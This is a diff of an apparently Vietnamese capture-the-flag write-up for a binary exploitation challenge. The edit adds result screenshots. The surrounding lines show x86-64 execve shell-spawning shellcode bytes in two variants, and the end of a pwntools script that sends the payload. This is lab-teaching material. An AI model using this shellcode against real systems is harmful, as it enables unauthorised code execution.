@@ -91,7 +91,12 @@ Với đoạn code assembly này, ta có shellcode là:
 \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
 ```
 
-Tuy nhiên, khi sử dụng shellcode này thì mình exploit không thành công nên mình thử bỏ câu lệnh `xor %rax,%rax` thì ta có shellcode là:
+Tuy nhiên, khi sử dụng shellcode này thì mình exploit không thành công.  
+
+![image](https://user-images.githubusercontent.com/44528004/146120764-cbdb1f46-04af-4497-b839-d1906e1e8381.png)
+
+
+Do đó, mình thử bỏ câu lệnh `xor %rax,%rax` thì ta có shellcode là:
 ```
 \x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
 ```
@@ -114,6 +119,10 @@ with open('payload.in', 'wb') as f:
 p.sendline(payload)
 p.interactive()
 ```
+
+### Kết quả exploit
+![image](https://user-images.githubusercontent.com/44528004/146120675-4724b372-7528-407a-8111-8e7aba981a68.png)
+
 
 ## Challenge 2
 ### Description
